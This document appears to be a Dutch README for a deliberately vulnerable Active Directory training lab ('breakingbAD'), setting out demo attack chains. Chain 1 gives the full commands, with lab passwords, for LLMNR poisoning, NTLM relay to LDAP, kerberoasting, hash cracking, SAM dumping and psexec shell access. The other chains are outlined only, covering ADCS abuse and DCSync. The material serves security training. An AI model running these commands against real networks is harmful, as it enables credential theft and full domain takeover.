# breakingbAD Attack Chains

Demo-scenario's die meerdere kwetsbaarheden combineren tot een realistische aanvalsketen.

**Domain:** `breakingbad.local` | **DC:** `192.168.100.10` | **srv01:** `192.168.100.20` | **srv02:** `192.168.100.21`

---

## Chain 1: Poisoning → Relay → Kerberoast → Local Admin (aanbevolen demo)

`06 (Responder poisoning) → relay naar LDAP (domain dump) → 07 (saul's wachtwoord in description) → 08 (kerberoast hector) → hector is local admin op srv01`

> **Verhaal:** Een aanvaller op het netwerk vangt credentials op via LLMNR/NBT-NS poisoning. In plaats van de hash te kraken, wordt de authenticatie direct doorgestuurd (relay) naar de Domain Controller via LDAP. De Domain Controller geeft alle domein-informatie prijs, inclusief het wachtwoord van saul.goodman dat in zijn description-veld staat. Met saul's account wordt een Kerberos-ticket opgevraagd voor hector.salamanca (kerberoasting). Na het kraken van dit ticket blijkt hector local administrator te zijn op srv01, wat directe toegang geeft tot de server. De hash van walter.white kan achteraf alsnog gekraakt worden als extra bewijs.

```bash
# === Stap 1: Responder + ntlmrelayx (twee terminals) ===

# Zet Responder.conf: SMB = Off, HTTP = Off (ntlmrelayx pakt die poorten)
sudo sed -i 's/^SMB      = On/SMB      = Off/' /usr/share/responder/Responder.conf
sudo sed -i 's/^HTTP     = On/HTTP     = Off/' /usr/share/responder/Responder.conf

# Terminal 1: ntlmrelayx relayt naar LDAP en dumpt domeininfo
sudo ntlmrelayx.py -t ldap://192.168.100.10 -smb2support -l /tmp/relay-loot

# Terminal 2: Responder voor name poisoning
sudo responder -I eth0 -dwv

# Terminal 3: Trigger de poisoning (walter.white zoekt een onbekende share)
./lab.sh vuln trigger 6

# ntlmrelayx output: "Dumping domain info for first time" + "Domain info dumped into lootdir!"
# walter.white's NTLMv2 hash wordt ook gelogd (crack achteraf als bonus)

# === Stap 2: Saul's wachtwoord uit de LDAP dump ===

# Bekijk de domain dump — saul.goodman's wachtwoord staat in zijn description
grep saul /tmp/relay-loot/domain_users.grep
# Output: saul.goodman ... 657crsH!

# Of open de HTML voor een mooiere weergave
firefox /tmp/relay-loot/domain_users.html

# === Stap 3: Kerberoast hector met saul's credentials ===

GetUserSPNs.py breakingbad.local/saul.goodman:"657crsH!" -dc-ip 192.168.100.10 \
  -request -outputfile ~/breakingbAD/demo/hashes/kerberoast.txt

# Crack de TGS hash
hashcat -m 13100 ~/breakingbAD/demo/hashes/kerberoast.txt /usr/share/john/password.lst
# Of: ~/breakingbAD/demo/hashcrack.sh kerberoast
# Result: hector.salamanca = 346modL!

# === Stap 4: Hector is local admin op srv01 ===

nxc smb 192.168.100.20 -u hector.salamanca -p "346modL!" -x 'whoami'
# Output: (Admin!) breakingbad\hector.salamanca

# Dump SAM, get a shell, etc.
nxc smb 192.168.100.20 -u hector.salamanca -p "346modL!" --sam
psexec.py breakingbad.local/hector.salamanca:"346modL!"@192.168.100.20

# === Bonus: Crack walter.white's hash achteraf ===

# Hash staat in ntlmrelayx output, kopieer naar demo/hashes
# hashcat -m 5600 ~/breakingbAD/demo/hashes/ntlmv2.txt /usr/share/john/password.lst

# Zet Responder.conf terug naar defaults
sudo sed -i 's/^SMB      = Off/SMB      = On/' /usr/share/responder/Responder.conf
sudo sed -i 's/^HTTP     = Off/HTTP     = On/' /usr/share/responder/Responder.conf
```

---

## Chain 2: ADCS Escalation

`09 (ASREPRoast jessie) → auth as jessie → 10 (ESC1 cert as Admin) → Domain Admin`

---

## Chain 3: Relay Attack

`03 (WebClient coerce srv02) → 01 (relay to ADCS web enrollment) → cert as machine → DCSync`

---

## Chain 4: Recon to Lateral Movement

`11 (anon enum users) → 07 (find saul's password in description) → 08 (kerberoast hector) → 12 (shared admin → lateral)`
